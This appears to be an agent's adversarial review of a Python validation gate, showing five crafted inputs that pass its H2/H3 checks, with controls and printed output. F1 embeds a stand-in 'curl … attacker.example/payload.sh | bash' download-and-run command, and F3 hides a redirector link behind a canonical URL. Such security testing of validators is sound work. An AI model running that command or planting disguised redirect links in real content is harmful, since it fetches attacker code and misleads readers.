VERDICT: BROKEN

Seat R46bRevF29H2H3 — attack on `corpus/instruments/r46-f29-gate.py` limbs H2+H3.
All runs are my own re-runs (gate invoked as `python3 corpus/instruments/r46-f29-gate.py --root <tree>`,
 committed instrument, read-only on --root). Golden tree built with the committed
`.ufo/waves/round-46/attempt2/controls/f29-fixture.py --mode positive` (copied into scratch, unmodified).
Each defect tree is exactly one mutation away from that 7/7 golden tree.

# Do-nothing controls (discrimination)

Recipe: `git -C <lane> archive 04af9bc9… corpus | tar -x -C base` and same at freeze `fe0f56b…`,
 then run the gate on both exports.

- base export printed:
  `gate H1 pass=0 read=rows=28 admitted=28 dup=0` … `f29-gate fixed=1/7 exit=1`
  (receipt `R46bRevF29H2H3.draft/base.txt`)
- freeze export printed:
  `gate H4 pass=1 read=recheck-rc=0 quotes-ok=9 frozen-cores-missing=0`,
  `gate H7 pass=1 read=census-rc=0 ok-line=1`, `f29-gate fixed=2/7 exit=1`
  (receipt `R46bRevF29H2H3.draft/freeze.txt`)
- golden positive printed `f29-gate fixed=7/7 exit=0` (receipt `…/positive.txt`)

The gate is not stuck green: the do-nothing trees read red. Every green reading below is
 caused by my constructed tree.

# Findings (each names the attacked check, the recipe, the printed lines)

## F1 (H2, medium) — recheck line with a trailing comment carrying executable text reads green

Attacked: `RECHECK_LINE` at `corpus/instruments/r46-f29-gate.py:91-93`
 (`(?: +#.*)?$`) and `ok_r` at line 191. The H2 contract (gate docstring lines 18-21)
 demands "exactly one `recheck:` line of the exact form `cd <lane> && python3 … --source S074`".

Recipe: in the golden entry, rewrite line 3 to
 `recheck: cd /home/vgpnk/Projects/shokunin/kasegi-shokunin && python3 corpus/instruments/source-recheck.py --manifest corpus/source-snapshots/round-46-a2/manifest.json --source S074  # && curl -sSf http://attacker.example/payload.sh | bash`
 (built by `R46bRevF29H2H3.draft/build-defects.py`, diff in `…/defect-diffs.txt`).
Mechanism check against the committed regex: `RECHECK_LINE.match -> True`.

Printed:
 `gate H2 pass=1 read=source=1 verified-at=1 recheck=1 sections=4/4 full=4/4 table-rows=6 xrefs=2/2 anchored=1`
 `f29-gate fixed=7/7 exit=0`  (receipt `…/d1-recheck-comment.txt`)

## F2 (H2, medium) — provenance trio in the first 8 lines but duplicated later reads green

Attacked: `ok_s`/`ok_v` at `r46-f29-gate.py:189-190` — `any(...)` over `body.splitlines()[:8]`
 only; nothing counts or forbids `source:`/`verified-at:` lines later in the body (only
 `recheck:` lines are counted, line 191).

Recipe: keep the head trio, then append after the last section:
 `source: S074 — https://docs.github.com/en/code-security/concepts/vulnerability-reporting-and-management/repository-security-advisories — duplicated provenance line buried after the sections`
 `verified-at: 2026-10-29`

Printed:
 `gate H2 pass=1 read=source=1 verified-at=1 recheck=1 sections=4/4 full=4/4 table-rows=6 xrefs=2/2 anchored=1`
 `f29-gate fixed=7/7 exit=0`  (receipt `…/d2-trio-dup.txt`)

## F3 (H3, high) — 11-cell S074 row whose URL is wrapped in a redirector reads green

Attacked: `h3` url check at `r46-f29-gate.py:250-251`:
 `u = re.findall(r"https?://\S+", row[1]); u[0].rstrip(".,;)") != URL` — only the FIRST
 URL in the raw cell text is compared; the markdown link target is never inspected.

Recipe: source cell becomes
 `GitHub Docs, Repository security advisories — [https://docs.github.com/en/code-security/concepts/vulnerability-reporting-and-management/repository-security-advisories ](https://redirector.example/collect?to=https%3A%2F%2Fdocs.github.com%2F)`
 (displayed text = canonical URL with a space before `]`, so `\S+` stops at the space;
 the clickable target is the redirector).
Mechanism: `gate findall first URL: https://docs.github.com/…/repository-security-advisories`,
 `equals canonical after rstrip('.,;)') -> True`, `redirector target present in cell -> True`.

Printed:
 `gate H3 pass=1 read=row-S074=ok`
 `f29-gate fixed=7/7 exit=0`  (receipt `…/d3-redirector.txt`)
The row also passes the fleet census: `sources-census.sh validate --file d3-redirector/corpus/SOURCES.md`
 printed `file	ok	…/d3-redirector/corpus/SOURCES.md`, `census-rc=0` — the redirector is invisible there too.

## F4 (H3, medium) — scope/teaches floors gamed by repeated words read green

Attacked: `r46-f29-gate.py:243-244`
 (`len(re.findall(r"\w+", row[4])) < 8`, same for `row[6]`) — raw word counts, no
 distinctness or content test.

Recipe: scope cell = `advisory advisory advisory advisory advisory advisory advisory advisory`
 (8 words), teaches cell = `practice practice practice practice practice practice practice practice`.

Printed:
 `gate H3 pass=1 read=row-S074=ok`
 `f29-gate fixed=7/7 exit=0`  (receipt `…/d4-repeated-words.txt`; exact row in `…/defect-diffs.txt`)

## F5 (H3, high) — anchor locator inside 1-42 naming the wrong file reads green

Attacked: `r46-f29-gate.py:246-247,253` — the cell must merely CONTAIN the substring
 `S074.txt` and the sha anywhere; the locator regex
 `(?:lines?|\bL)\s*(\d+)\s*[-–]\s*L?(\d+)` is matched against the whole cell without
 binding it to the S074 capture.

Recipe: anchor cell becomes
 `heading and body prose lines 3-9 of corpus/source-snapshots/round-44/S068.txt (WRONG FILE: this locator names S068, not the pinned capture corpus/source-snapshots/round-46-a2/S074.txt) (snapshot 42 lines, 7087 bytes; …), sha256 1296528d…8039`
 — locator `lines 3-9` is inside 1-42, `S074.txt` and the sha both still appear in the cell.

Printed:
 `gate H3 pass=1 read=row-S074=ok`
 `f29-gate fixed=7/7 exit=0`  (receipt `…/d5-wrong-file-locator.txt`)

# Limitations

- The golden tree is the committed R50 fixture's positive mode, not the wave's final entry;
  the attacked checks are structural, and each defect is a single-file mutation independent of entry prose.
- F1's payload sits behind `#` and is shell-inert when pasted; the regex anchors `--source S074`
  before the optional comment, so non-inert executable text cannot pass. F1 is a contract-precision
  gap ("exact form" in the docstring vs `(?: +#.*)?` in the regex), not an execution path.
- F3's redirector host is inert and nothing was fetched (live-target testing refused);
  no network evidence is claimed.
- Severity ratings are my judgment. The C2 kill-rule controls named in claims.json
  (do-nothing, junk, fabricated) behave as the R50 receipt states — I re-ran positive/base/freeze
  myself; the five classes above are additional gaps outside that named set.
- Recommended counter-checks (recommendation only, not applied): forbid or document the trailing
  recheck comment; count provenance lines over the whole body; compare the markdown link target,
  not the first raw URL; require ≥8 distinct words in scope/teaches; bind the locator's file token
  to the snapshot basename.

No production file was edited; scratch `/fast/scratch/hyaku/kasegi-r46/R46bRevF29H2H3` removed after
 receipts were copied to `R46bRevF29H2H3.draft/`. No tools installed this seat.
